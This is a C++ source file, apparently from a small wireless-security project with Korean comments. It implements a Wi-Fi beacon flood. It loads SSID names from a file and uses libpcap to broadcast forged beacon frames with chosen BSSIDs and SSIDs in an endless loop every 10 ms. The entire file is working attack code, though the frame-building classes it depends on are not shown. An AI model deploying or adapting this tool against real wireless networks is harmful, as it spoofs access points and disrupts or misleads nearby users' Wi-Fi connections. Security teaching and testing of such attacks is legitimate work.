#include "beacon_flood.h"
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstring>
#include <cstdlib>
#include <unistd.h>   // for usleep
#include <pcap.h>

#include <iomanip>   // for setw, setfill
#include <sstream>   // for stringstream

#include "radiotap.h"
#include "beaconframe.h"
#include "tagedparam.h"
#include "beaconpacket.h"

using namespace std;

string mac_to_string(const uint8_t mac[6]) {
    stringstream ss;
    ss << hex << setw(2) << setfill('0') << (int)mac[0];
    for (int i = 1; i < 6; i++) {
        ss << ":" << setw(2) << setfill('0') << (int)mac[i];
    }
    return ss.str();
}


vector<string> load_ssid_list(const string &filename) {
    vector<string> ssids;
    ifstream ifs(filename);
    if (!ifs.is_open()) {
        cerr << "Failed to open SSID list file: " << filename << endl;
        return ssids;
    }

    string line;
    while (getline(ifs, line)) {
        if (!line.empty()) {
            ssids.push_back(line);
        }
    }
    return ssids;
}

void start_beacon_flood(const std::string &ifname,
                        const std::vector<BeaconPacket> &beaconList)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(ifname.c_str(), 1024, 1, 1000, errbuf);
    if (!handle) {
        std::cerr << "pcap_open_live(" << ifname << ") failed: " << errbuf << std::endl;
        return;
    }

    while (true) {
        for (auto &bp : beaconList) {
            // 직렬화
            std::vector<uint8_t> packet = bp.toBytes();

            // 전송
            if (pcap_sendpacket(handle, packet.data(), packet.size()) != 0) {
                std::cerr << "[!] pcap_sendpacket error: "
                          << pcap_geterr(handle) << std::endl;
            } else {
                // 디버깅
                std::cout << "[DEBUG] Sent Beacon: BSSID="
                          << bp.beaconHdr.getBssidString()
                          << ", SSID=" << bp.ssid << std::endl;
            }
        }
        usleep(10000); // 10ms
    }

    pcap_close(handle);
}